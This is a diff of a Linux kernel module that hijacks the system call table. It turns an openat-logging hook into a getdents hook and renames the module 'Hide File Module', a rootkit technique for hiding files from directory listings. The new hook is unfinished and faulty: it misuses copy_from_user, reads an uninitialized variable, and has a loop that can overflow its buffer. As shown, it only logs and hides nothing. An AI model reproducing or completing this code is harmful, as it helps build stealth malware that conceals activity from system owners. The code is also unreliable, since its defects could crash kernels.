@@ -9,9 +9,10 @@
 #include <asm/paravirt.h>
 
 
+
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("SourceCodeDeleted");
-MODULE_DESCRIPTION("Simple Hooking Of a Syscall");
+MODULE_DESCRIPTION("Hide File Module");
 MODULE_VERSION("1.0");
 
 
@@ -28,32 +29,65 @@ void DisablePageWriting(void){
 
 } 
 
-bool StartsWith(const char *a, const char *b)
-	{
-		if(strncmp(a, b, strlen(b)) == 0) return 1;
-		return 0;
-	}
 
 
 //define our origional function. 
-asmlinkage int ( *original_open ) (int dirfd, const char *pathname, int flags); 
+
+/*
+int getdents(unsigned int fd,   struct linux_dirent   *dirp,    unsigned int count);
+int getdents64(unsigned int fd, struct linux_dirent64 *dirp,    unsigned int count);
+*/
+
+//struct linux_dirent {
+//               unsigned long  d_ino;     /* Inode number */
+//               unsigned long  d_off;     /* Offset to next linux_dirent */
+//               unsigned short d_reclen;  /* Length of this linux_dirent */
+//               char           d_name[];  /* Filename (null-terminated) */
+                                 /* length is actually (d_reclen - 2 -
+                                    offsetof(struct linux_dirent, d_name)) */
+               /*
+               char           pad;       // Zero padding byte
+               char           d_type;    // File type (only since Linux
+                                         // 2.6.4); offset is (d_reclen - 1)
+               */
+//           }
+
+struct linux_dirent {
+	unsigned long	d_ino;    /* Inode number */
+	unsigned long	d_off;	  /* Offset to next linux_dirent */
+	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
+	char		    d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
+};
 
 
 
+
+asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count); 
 
 //Create Our version of Open Function. 
-asmlinkage int	HookOpen(int dirfd, const char *pathname, int flags){
+asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
 
-	if(pathname != NULL ){
-		printk(KERN_INFO "File Opened %s", pathname);
+	
+	char letter ;
+	int i = 0;
+	char  directory[255];
+	int doff = 0 ;
+	//int ret = original_getdents(fd, dirp, count);
+	//void * CopyOfStuff = kzalloc(1024, GFP_KERNEL);
 
-}
-else{
-printk(KERN_INFO "File Not Opened");
+	copy_from_user(doff, dirp->d_off, 1);
 
-}
+	while (letter != 0 || i < 6){ 
+	get_user(letter, dirp->d_name+i);
+	get_user(letter, dirp->d_name+i);
+	directory[i] = letter ;
+	i++;
+	}
 
-	return (*original_open)(dirfd, pathname, flags);
+	printk(KERN_INFO "FILE Found %x ", doff);  
+
+
+	return (*original_getdents)(fd, dirp, count); 
 }
 
 
@@ -72,8 +106,8 @@ static int __init SetHooks(void) {
 	EnablePageWriting();
 
   // Replaces Pointer Of Syscall_open on our syscall.
-	original_open = (void*)SYS_CALL_TABLE[__NR_openat];
-	SYS_CALL_TABLE[__NR_openat] = (unsigned long*)HookOpen;
+	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
+	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)HookGetDents;
 	DisablePageWriting();
 
 	return 0;
@@ -89,7 +123,7 @@ static void __exit HookCleanup(void) {
 
 	// Clean up our Hooks
 	EnablePageWriting();
-	SYS_CALL_TABLE[__NR_openat] = (unsigned long*)original_open;
+	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
 	DisablePageWriting();
 
 	printk(KERN_INFO "HooksCleaned Up!");
@@ -99,52 +133,3 @@ module_init(SetHooks);
 module_exit(HookCleanup);
 
 
-//STRACE 
-/*
-root@anonHost:~# strace cat somefile 
-execve("/bin/cat", ["cat", "somefile"], 0x7ffd43175fe8 ) = 0
-brk(NULL)                               = 0x5614699df000
-access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
-access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
-openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
-fstat(3, {st_mode=S_IFREG|0644, st_size=169782, ...}) = 0
-mmap(NULL, 169782, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f459a155000
-close(3)                                = 0
-access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
-openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
-read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\260\34\2\0\0\0\0\0"..., 832) = 832
-fstat(3, {st_mode=S_IFREG|0755, st_size=2030544, ...}) = 0
-mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f459a153000
-mmap(NULL, 4131552, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f4599b67000
-mprotect(0x7f4599d4e000, 2097152, PROT_NONE) = 0
-mmap(0x7f4599f4e000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7f4599f4e000
-mmap(0x7f4599f54000, 15072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f4599f54000
-close(3)                                = 0
-arch_prctl(ARCH_SET_FS, 0x7f459a154540) = 0
-mprotect(0x7f4599f4e000, 16384, PROT_READ) = 0
-mprotect(0x56146832f000, 4096, PROT_READ) = 0
-mprotect(0x7f459a17f000, 4096, PROT_READ) = 0
-munmap(0x7f459a155000, 169782)          = 0
-brk(NULL)                               = 0x5614699df000
-brk(0x561469a00000)                     = 0x561469a00000
-openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
-fstat(3, {st_mode=S_IFREG|0644, st_size=4547104, ...}) = 0
-mmap(NULL, 4547104, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f4599710000
-close(3)                                = 0
-fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
-openat(AT_FDCWD, "somefile", O_RDONLY)  = 3
-fstat(3, {st_mode=S_IFREG|0644, st_size=46, ...}) = 0
-fadvise64(3, 0, 0, POSIX_FADV_SEQUENTIAL) = 0
-mmap(NULL, 139264, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f459a15d000
-read(3, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 131072) = 46
-write(1, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 46aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-) = 46
-read(3, "", 131072)                     = 0
-munmap(0x7f459a15d000, 139264)          = 0
-close(3)                                = 0
-close(1)                                = 0
-close(2)                                = 0
-exit_group(0)                           = ?
-+++ exited with 0 +++
-
-*/
